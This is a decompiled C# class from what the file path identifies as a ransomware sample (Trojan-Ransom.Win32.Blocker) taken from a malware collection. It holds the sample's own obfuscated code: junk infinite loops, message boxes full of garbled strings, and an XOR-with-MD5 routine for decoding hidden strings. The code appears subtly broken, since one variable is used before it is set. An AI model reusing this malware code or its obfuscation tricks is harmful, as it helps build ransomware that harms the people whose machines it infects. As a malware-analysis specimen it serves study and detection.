// Decompiled with JetBrains decompiler
// Type: Basic.hq
// Assembly: Basic, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 21415B0B-B3B0-4A62-BCE9-2C3BA0D8DBDA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.ruh-6129b6d6cbbe024a97043b9842fc2714a54ff2fdcde90a6abe868d1ed17fea85.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Security.Cryptography;
using System.Text;

namespace Basic
{
  public class hq
  {
    public object Uq6wExoaftFAhvw5Z0CmEky3FB91() => (object) 7055;

    public void Lx9R1O3b0NIGQ()
    {
      while (true)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          int num1 = 1604415;
          while (num1 <= 163)
          {
            int num2 = (int) Interaction.MsgBox((object) "-h\u008D+vut)6\u007FETOj|u@‡AQ:u†@‹_A~ffXzˆC ‰ I2W„<|5|__x{*v€X\u008DtKtl27T‰UbG^^+j†tŠu}`‘ŒqWL’\\#\\ƒjBŽag4G6\u008DŽy9€> S-ˆH\u007F*nLvR#4x8‹†Œro<c]sMszze7r„9K^N-4#`fa~502Qu*(€Y0R‰+6\u008D+B†z_r2ŽLm]xxn/h!r\u007Fa;B%p]J8s7ŽgBŠ9‹=");
            checked { ++num1; }
          }
          ProjectData.ClearProjectError();
        }
        int num = (int) Interaction.MsgBox((object) "HU['.W4w‰$n]@&…+qŒ…h7]$g…JpIK#ck\u008D|xyFcEKk,>~drV[7„€YsL.ŠWS<,WM] *…F=<+x-fY\u0090*?85‡42Y6*‹`m\u0081B…G8‡=b>tqL9?+,r†9O$j>P*8B;#} \u008DxbN");
      }
    }

    public static byte[] R_(string Input, string pass)
    {
      StringBuilder stringBuilder = new StringBuilder();
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pass));
      int num = checked (Input.Length - 1);
      int startIndex = 0;
      while (startIndex <= num)
      {
        int index;
        string str = Conversions.ToString(Strings.Chr(checked ((int) (Conversions.ToLong("&H" + Input.Substring(startIndex, 2)) ^ (long) hash[index]))));
        stringBuilder.Append(str);
        if (index == checked (pass.Length - 1))
          index = 0;
        else
          checked { ++index; }
        checked { startIndex += 2; }
      }
      return Encoding.Default.GetBytes(stringBuilder.ToString());
    }

    private object sai60mSQAgPOs6w()
    {
      while (true)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
